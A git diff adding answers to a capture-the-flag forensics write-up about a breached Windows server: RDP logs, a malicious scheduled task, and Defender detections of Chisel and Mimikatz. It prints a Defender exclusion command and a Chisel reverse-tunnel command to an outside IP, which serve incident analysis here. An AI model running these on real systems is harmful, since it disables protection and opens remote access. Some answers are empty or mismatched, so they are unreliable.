@@ -123,18 +123,167 @@ It is classified a medium-level walkthrough, , and you can join it for 🆓 usin
 <br>
 
 > 4.3. <em>What command was run to exclude the file from Windows Defender?</em>.<a id='4.3'></a>
->> <code><strong>Add-MpPreference -ExclusionPath C:\Apache24</strong></code><br><br>
+>> <code><strong>Add-MpPreference -ExclusionPath C:\Apache24</strong></code><br>
 
 <br>
 
 ![image](https://github.com/user-attachments/assets/7b46b75a-6caf-49fb-a579-a5117dd02007)
 
 
+<br>
+
+> 4.4. <em></em>.<a id='4.4'></a>
+>> <code><strong>RDP</strong></code><br>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/4f78f2d7-7a87-463d-850b-5ab445e27400)
+
+
+<br>
+<br>
+
 <h2>Task 5 . Breached Admin | RDP Session Logs</h2>
+
+<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
+
+> 5.1. <em>What was the first command entered by the attacker?</em>.<a id='5.1'></a>
+>> <code><strong>2025-01-23 17:00:12</strong></code><br>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/facf47fb-9070-4993-b3c5-365a3e98597f)
+
+<br>
+
+
+> 5.2. <em>What user did the attacker breach? (format: HOSTNAME\USER)</em>.<a id='5.2'></a>
+>> <code><strong>HR01-SRV\Administrator</strong></code><br>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/bdf37209-049c-4504-b0fc-93ab38baff32)
+
+<br>
+
+> 5.3. <em>What IP is shown as the source of the RDP login?</em>.<a id='5.3'></a>
+>> <code><strong>10.10.23.190</strong></code><br>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/18e52dd7-c19d-4914-b362-cf2c1e5bffb9)
+
+<br>
+
+> 5.4. <em>What is the timestamp when the attacker disconnected from RDP? (format: 2025-01-05 15:30:45)</em>.<a id='5.3'></a>
+>> <code><strong>2025-01-23 17:16:46</strong></code><br>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/c1419260-f966-420f-8579-557d330228d6)
+
+<br>
+<br>
 
 <h2>Task 6 . Persistance Traces | Scheduled Tools</h2>
 
+<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
+
+> 6.1. <em>What is the name of the suspicious scheduled task?</em>. Hint : <em>Correlate task creation time with the incident timeline.</em><a id='6.1'></a>
+>> <code><strong>Apache Proxy</strong></code><br>
+
+<br>
+
+<p>- RDP login : <code>2025-01-23 17:00:12</code><br><br>
+-  Registered Scheduler Task: <code>2025-01-23 17:05:37</code>code><br><br>
+- RDP logon: <code>2025-01-23 17:16:46</code></p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/e11846ae-84fc-486d-b780-aa50ad9ff36f)
+
+> 6.2. <em>When was the suspicious scheduled task created? (format: 2025-01-05 15:30:45)</em></em><a id='6.2'></a>
+>> <code><strong>2025-01-23 17:05:37</strong></code><br>
+
+<br> 
+
+![image](https://github.com/user-attachments/assets/829ed0c4-b65b-41b5-b4f0-c63013477322)
+
+<br>
+
+
+> 6.3. <em>What is the task's "Trigger" value as shown in Task Scheduler GUI?</em></em><a id='6.3'></a>
+>> <code><strong>At system startup</strong></code><br>
+
+<br> 
+
+![image](https://github.com/user-attachments/assets/69a29180-12df-4790-9f43-1a7d36f36a10)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/95391437-6d35-4413-9ab2-0537451484f7)
+
+
+<br>
+
+
+> 6.4. <em>What is the full command line of the malicious task?</em></em><a id='6.4'></a>
+>> <code><strong>C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389</strong></code><br>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/ffad2d4b-58ec-4e4e-9f24-5173eb0e6f12)
+
+<br>
+<br>
+
+
+
+
 <h2>Task 7 . Credentials Access | Windows Defender</h2>
+
+<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
+
+> 7.1. <em>What is the threat family ("Name") of the first quarantined file? </em>.<a id='7.1'></a>
+>> <code><strong>VirTool:Win64/Chisel.G</strong></code><br>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/080e8186-16ee-4e01-8a71-fe7da913b321)
+
+
+<br>
+
+![image](https://github.com/user-attachments/assets/7efd9e7f-ac3e-4e74-867a-c98142bce0b4)
+
+<br>
+
+> 7.2. <em>And what is the threat family of the next detected malware?</em>.<a id='7.2'></a>
+>> <code><strong>HackTool:Win32/Mimikatz!pz</strong></code><br>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/bbda7b9a-c01c-420a-b7fc-28c0a95d33fb)
+
+
+<br>
+
+> 7.3. <em>What is the file name of the downloaded Mimikatz executable?</em>.<a id='7.2'></a>
+>> <code><strong>mimi.exe</strong></code><br>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/7d4c0d68-5c93-49f0-bf9c-284aee5bb061)
+
+<br>
+
+> 7.4. <em>Finally, which Mimikatz command was used to extract hashes from LSASS memory?</em>. Hint: <em>Time to get back to PowerShell logs!</em><a id='7.2'></a>
+>> <code><strong>mimi.exe</strong></code><br>
+
+<br>
+
+<br>
+<br>
 
 <h2>Task 8 . Conclusion</h2>
 
